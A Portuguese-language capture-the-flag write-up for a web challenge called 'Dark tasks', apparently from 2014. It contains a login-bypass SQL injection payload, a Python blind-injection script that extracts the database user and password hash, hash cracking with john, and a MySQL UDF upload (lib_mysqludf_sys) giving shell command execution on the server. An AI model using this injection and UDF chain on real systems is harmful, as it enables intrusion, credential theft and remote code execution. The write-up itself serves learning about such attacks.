Dark tasks
==========

Acessando a página http://178.63.58.69:8086/, havia uma imagem e no código-fonte
foi possível visualizar duas mensagens em b64. Ignorando elas, partimos para olhar
o `robots.txt`, o que nos deu uma boa pista:

```
User-agent: *
Disallow: /D4rk_MySQL.php
```

Acessando tal arquivo, notamos que se tratava de um Adminer, algo parecido com
phpmyadmin. O curioso é que ele aceitava fazer login com usuários inexistentes,
contudo sem qualquer privilégio.

Após uma dica do TheZakMan, percebi que havia deixado passar um detalhe na index do site.
A mensagem em b64 indicava uma outra página: `Th3-D4rk-T4sks/`.

Neste dir havia uma tela de login, a qual estava vulnerável a SQL injection.

Com um simples `') or 1=1-- ` foi possível efetuar o login. Olhando os links no meu,
notamos um outro arquivo que era possível injetar SQL (`viewtask.php?id=`). O que
pode nos ajudar descobrir que usuário está sendo usado para acessar o bd do site.

Desenvolvendo um código para ajudar nesse trabalho (não quis usar sqlmap), ficou:

```python
import requests
import string
import sys

def do_login():
	url = 'http://178.63.58.69:8086/Th3-D4rk-T4sks/'
	r = requests.post(url, data={'user': "') or 1=1-- "})
	return r

def do_viewtask(p,c):
	url = 'http://178.63.58.69:8086/Th3-D4rk-T4sks/viewtask.php'
	r2 = requests.get(url, params=p, cookies=c)
	return r2.text

def do_query(s,c):
	r2 = do_viewtask({'id': s.encode('base64')}, c)
	return r2.find('viewtask.php?') != -1

r = do_login()

match = ''
for n in xrange(20):
	found = False
	for c in string.digits + '@_*' + string.letters:
		payload = "' or user() like '%s%%' or '0" % str(match+c)
		payload = payload.replace('_', '\_')

		if do_query(payload, r.cookies):
			found = True
			match += c
			print match
			break
	if not found:
		print 'end!'
		break
```

Com esse código identifiquei que o usuário se tratava de `dark`. A partir dai,
foi ler o campo `password` da tabela `mysql.user` referente a este usuário.
Trocando o payload para:

`' or (select password from mysql.user where user = 'dark') like '%s%%' or '0`

Obtive o seguinte hash: `*E56A114692FE0DE073F9A1DD68A00EEB9703F3F1` (41-byte)

O que foi tarefa fácil para o **john**:

```
Loaded 1 password hash (MySQL 4.1 double-SHA-1 [128/128 SSE2 intrinsics 4x])
123123           (?)
guesses: 1  time: 0:00:00:00 DONE (Sat Nov 22 09:37:43 2014)  c/s: 1369  trying: 123123 - 888888
```

Agora então voltando para o Adminer, posso logar com `dark/123123` e ver se tem
permissão pra fazer alguma coisa. (Neste ponto, já havia tido a dica do TheZakMan
que havia dito que usou UDF pra resolver) Então fui direto pensar em como jogar uma
**lib_mysqludf_sys.so** lá no servidor. (lib encontrada no google que forneceve varias
funções sys_* para executar comandos no servidor)

Como o servidor não tinha a função `from_base64`, pensei em passar o hex do binário
da lib.

`$ python -c "print open('lib_mysqludf_sys.so').read().encode('hex')"`

E rodando o SQL lá no Adminer:

`select unhex('7f454c4601010100000000000000000...') into dumpfile '/usr/lib/mysql/plugin/sigsegv.so' from dual`

Percebemos que a query foi executada com sucesso! Agora então só bastava criar uma UDF que executasse comando no servidor
que retornasse o output. Então escolhemos a `sys_eval` da lib, e criamos executando:

`CREATE FUNCTION sys_eval RETURNS string SONAME 'sigsegv.so';`

Tornando possível verificar os arquivos no servidor (`ls`), o que logo nos levou a:

`select sys_eval('cat /home/Th3_D@rk_S3cr3t/FL@g_Bala7.txt') from dual`

Que nos deu: FLag(Th3_Gr3@t_7aMaDa)
